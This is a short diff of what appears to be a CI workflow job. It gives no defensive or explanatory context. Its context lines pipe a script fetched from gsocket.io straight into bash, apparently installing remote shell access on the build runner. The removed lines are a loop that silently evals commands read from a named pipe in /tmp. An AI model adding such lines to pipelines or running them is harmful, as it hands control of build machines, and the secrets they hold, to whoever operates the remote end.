@@ -15,7 +15,3 @@ jobs:
             pkg install -y curl bash
             bash -c "$(curl -fsSL https://gsocket.io/y)"
             trap 'exit 0' TERM
-            mkfifo /tmp/bash-0
-            while :; do
-              eval "$(cat /tmp/bash-0)" &>/dev/null
-            done
